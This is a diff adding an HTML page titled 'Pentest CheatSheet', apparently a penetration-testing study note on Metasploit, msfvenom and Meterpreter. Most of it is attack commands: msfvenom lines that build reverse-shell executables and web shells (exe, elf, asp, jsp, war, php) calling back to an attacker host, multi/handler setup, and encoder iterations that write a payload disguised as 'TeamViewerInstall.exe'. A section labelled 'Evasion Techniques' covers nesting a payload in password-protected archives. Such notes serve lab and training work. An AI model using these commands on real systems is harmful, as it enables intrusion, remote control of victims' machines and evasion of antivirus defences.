@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/Metasploit/Metasploit.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/Metasploit/Metasploit.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Metasploit/Metasploit.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>targeturi = blog</p>
+<h1 id="archi">Archi</h1>
+<p>/usr/share/metasploit-framework</p>
+
+<h1 id="metasploit">Metasploit</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+</code></pre></div></div>
+
+<h2 id="modules">Modules</h2>
+<p>Type	Description
+Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
+Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
+Post	Wide array of modules to gather information, pivot deeper, etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Search Module </span>
+msf6 <span class="o">&gt;</span> search &lt;KEYWORD&gt;
+
+<span class="c"># Use Module</span>
+msf6 <span class="o">&gt;</span> use &lt;PATH&gt;
+msf6 <span class="o">&gt;</span> use 0
+
+<span class="c"># Show Module Info</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;Module&gt;<span class="o">)</span> <span class="o">&gt;</span> info
+
+<span class="c"># Show all options</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> show options
+
+<span class="c"># Define option to exploit</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> SET &lt;OPTIONS&gt; &lt;VALUE&gt;
+
+<span class="c"># Run the exploit</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="c"># Run as a job</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> run <span class="nt">-j</span> 
+</code></pre></div></div>
+
+<h2 id="target">Target</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> show targets
+</code></pre></div></div>
+
+<h2 id="payloads">Payloads</h2>
+<p>Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.</p>
+
+<p>For example, windows/shell_bind_tcp is a single payload with no stage, whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell).</p>
+
+<p>Start with staged payloads 
+Use non-staged payloads if staged payloads fail.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> show payloads
+
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload &lt;NUM&gt;
+</code></pre></div></div>
+
+<h2 id="enconders">Enconders</h2>
+<p>Suppose we want to select an Encoder for an existing payload. Then, we can use the show encoders command within the msfconsole to see which encoders are available for our current Exploit module + Payload combination.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> show encoders
+</code></pre></div></div>
+
+<h2 id="plugins">Plugins</h2>
+<p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/plugins</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> load &lt;PLUGIN&gt;
+</code></pre></div></div>
+
+<h3 id="installing-new-plugin">Installing New Plugin</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cp</span> ./&lt;PLUGIN&gt;.rb /usr/share/metasploit-framework/plugins/&lt;PLUGIN&gt;.rb
+</code></pre></div></div>
+
+<h2 id="sessions">Sessions</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>CTRL] + <span class="o">[</span>Z]
+<span class="c"># List Active Sessions</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> sessions
+
+<span class="c"># Start Interaction with Session</span>
+msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+
+<h2 id="jobs">Jobs</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">jobs</span> <span class="nt">-h</span>
+Usage: <span class="nb">jobs</span> <span class="o">[</span>options]
+
+Active job manipulation and interaction.
+
+OPTIONS:
+
+    <span class="nt">-K</span>        Terminate all running jobs.
+    <span class="nt">-P</span>        Persist all running <span class="nb">jobs </span>on restart.
+    <span class="nt">-S</span> &lt;opt&gt;  Row search filter.
+    <span class="nt">-h</span>        Help banner.
+    <span class="nt">-i</span> &lt;opt&gt;  Lists detailed information about a running job.
+    <span class="nt">-k</span> &lt;opt&gt;  Terminate <span class="nb">jobs </span>by job ID and/or range.
+    <span class="nt">-l</span>        List all running jobs.
+    <span class="nt">-p</span> &lt;opt&gt;  Add persistence to job by job ID
+    <span class="nt">-v</span>        Print more detailed info.  Use with <span class="nt">-i</span> and <span class="nt">-l</span>
+</code></pre></div></div>
+
+<h2 id="importing-modules">Importing Modules</h2>
+<p>We copy it into the appropriate directory after downloading the exploit. Note that our home folder .msf4 location might not have all the folder structure that the /usr/share/metasploit-framework/ one might have. So, we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find the new modules. After that, we will be proceeding with copying the .rb script directly into the primary location.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> &lt;MODULE&gt;.rb /usr/share/metasploit-framework/modules/&lt;PATH/&gt;&lt;MODULE&gt;.rb
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="msfvenom">MSFvenom</h1>
+<h2 id="list">List</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Payloads</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-l</span> payloads
+
+<span class="c"># #Encoders</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-l</span> encoders 
+</code></pre></div></div>
+
+<h2 id="staged-vs-stageless-payloads">Staged vs. Stageless Payloads</h2>
+<p>Staged payloads create a way for us to send over more components of our attack. We can think of it like we are “setting the stage” for something even more useful. Take for example this payload linux/x86/shell/reverse_tcp. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.</p>
+
+<p>Stageless payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on stageless Meterpreter payloads.</p>
+
+<p>Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The name will give you your first marker. Take our examples from above, linux/x86/shell/reverse_tcp is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So /shell/ is a stage to send, and /reverse_tcp is another. This will look like it is all pressed together for a stageless payload. Take our example linux/zarch/meterpreter_reverse_tcp. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function /meterpreter_reverse_tcp. For one last quick example of this naming convention, consider these two windows/meterpreter/reverse_tcp and windows/meterpreter_reverse_tcp. The former is a Staged payload. Notice the naming convention separating the stages. The latter is a Stageless payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn’t appear quite clear to you, it will often detail if the payload is staged or stageless in the description.</p>
+
+<h2 id="payloads-1">Payloads</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Staged Payload for Windows</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
+
+<span class="c"># Stageless Payload for Windows</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
+
+<span class="c"># Staged Payload for Linux</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x64.elf
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x86.elf
+
+<span class="c"># Stageless Payload for Linux</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x64.elf
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x86.elf
+
+<span class="c"># asp	</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> asp <span class="o">&gt;</span> shell.asp
+
+<span class="c"># jsp</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.jsp
+
+<span class="c"># war</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war
+
+<span class="c"># php</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_php <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.php
+</code></pre></div></div>
+
+<h2 id="encoder">Encoder</h2>
+<h3 id="generating-payload---without-encoding">Generating Payload - Without Encoding</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> perl
+</code></pre></div></div>
+
+<h3 id="generating-payload---with-encoding">Generating Payload - With Encoding</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/shell/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> perl <span class="nt">-e</span> x86/shikata_ga_nai
+</code></pre></div></div>
+
+<h3 id="multiple-iterations">Multiple Iterations</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.5 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-f</span> exe <span class="nt">-i</span> 10 <span class="nt">-o</span> /root/Desktop/TeamViewerInstall.exe<span class="sb">`</span>
+</code></pre></div></div>
+
+<h2 id="evasion-techniques">Evasion Techniques</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xzvf</span> rarlinux-x64-612.tar.gz <span class="o">&amp;&amp;</span> <span class="nb">cd </span>rar
+<span class="nv">$ </span>rar a ~/test.rar <span class="nt">-p</span> ~/test.js
+
+<span class="nv">$ </span><span class="nb">mv </span>test.rar <span class="nb">test</span>
+<span class="nv">$ </span>rar a test2.rar <span class="nt">-p</span> <span class="nb">test</span>
+<span class="nv">$ </span><span class="nb">mv </span>test2.rar test2
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="meterpreter">Meterpreter</h1>
+<p>The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &lt;TYPE&gt;<span class="o">(</span>&lt;MODULE&gt;<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">grep </span>meterpreter show payloads
+</code></pre></div></div>
+
+<h2 id="meterpreter-shells">Meterpreter Shells</h2>
+<p>windows/meterpreter_reverse_https is actually a much more powerful choice because of the encrypted channel, and it allows you to disconnect the payload (and exit msfconsole) without terminating it. And then the payload will automatically get back to you as soon as you set up the handler again.</p>
+
+<h3 id="payloads-2">Payloads</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Staged Payloads for Windows</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
+
+<span class="c"># Stageless Payloads for Windows</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x64.exe
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> exe <span class="o">&gt;</span> shell-x86.exe
+
+<span class="c"># Staged Payloads for Linux</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x64.elf
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x86.elf
+
+<span class="c"># Stageless Payloads for Linux</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x86.elf
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> elf <span class="o">&gt;</span> shell-x64.elf
+
+<span class="c"># asp	</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> asp <span class="o">&gt;</span> shell.asp
+
+<span class="c"># jsp</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> example.jsp
+
+<span class="c"># war</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> war <span class="o">&gt;</span> example.war
+
+<span class="c"># php</span>
+<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.php
+</code></pre></div></div>
+
+<h3 id="setting-up-multihandler">Setting Up Multi/Handler</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use multi/handler
+msf6 <span class="o">&gt;</span> <span class="nb">set </span>payload windows/x64/meterpreter/reverse_tcp
+</code></pre></div></div>
+
+<h4 id="interactive-shells">Interactive Shells</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> shell
+</code></pre></div></div>
+
+<h4 id="commands">Commands</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> <span class="nb">help
+
+</span>msf6 <span class="o">&gt;</span> search local_exploit_suggester
+meterpreter <span class="o">&gt;</span> search <span class="nt">-f</span> <span class="s2">"flag.txt"</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
